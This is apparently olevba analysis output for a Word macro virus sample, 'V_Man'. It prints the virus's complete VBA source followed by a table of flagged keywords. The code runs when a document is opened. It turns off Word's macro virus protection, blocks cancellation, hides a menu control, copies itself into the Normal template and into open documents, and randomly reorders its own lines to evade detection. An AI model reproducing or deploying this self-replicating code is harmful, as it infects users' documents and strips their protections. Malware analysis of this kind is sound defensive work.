olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.V_Man-1e97dce77dd69974cbc37d1f6849726ab3a24f07
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.V_Man-1e97dce77dd69974cbc37d1f6849726ab3a24f07 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
GoTo 10
110 If NormInstalled = True And ActInstalled = True Then Exit Sub Else: GoTo 120
20 Options.VirusProtection = False: GoTo 30
10 Application.EnableCancelKey = wdCancelDisabled: GoTo 20
160 Randomize Timer: GoTo 170
70 NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1): GoTo 80
130 IL = Carrier.CountOfLines: GoTo 140
140 With Carrier: VirCode = .Lines(1, .CountOfLines): End With: GoTo 150
60 Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule: GoTo 70
170 For i = 4 To IL - 1: RL = Int(Rnd * (IL - 5)) + 4: GCL = Infection.Lines(i, 1): Infection.DeleteLines i, 1: Infection.InsertLines RL, GCL: Next i: Exit Sub
40 Application.CommandBars("Tools").Controls(12).Visible = False: GoTo 50
150 With Infection: .DeleteLines 1, Infection.CountOfLines: .InsertLines 1, VirCode: End With: GoTo 160
120 If NormInstalled = False Then: Set Infection = NormCarrier: Set Carrier = ActCarrier: GoTo 130: Else: Set Infection = ActCarrier: Set Carrier = NormCarrier: GoTo 130
90 If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True: GoTo 100 Else NormInstalled = False: GoTo 100
80 AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1): GoTo 90
100 If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True: GoTo 110 Else ActInstalled = False: GoTo 110
30 Options.SaveNormalPrompt = False: GoTo 40
50 Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule: GoTo 60
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

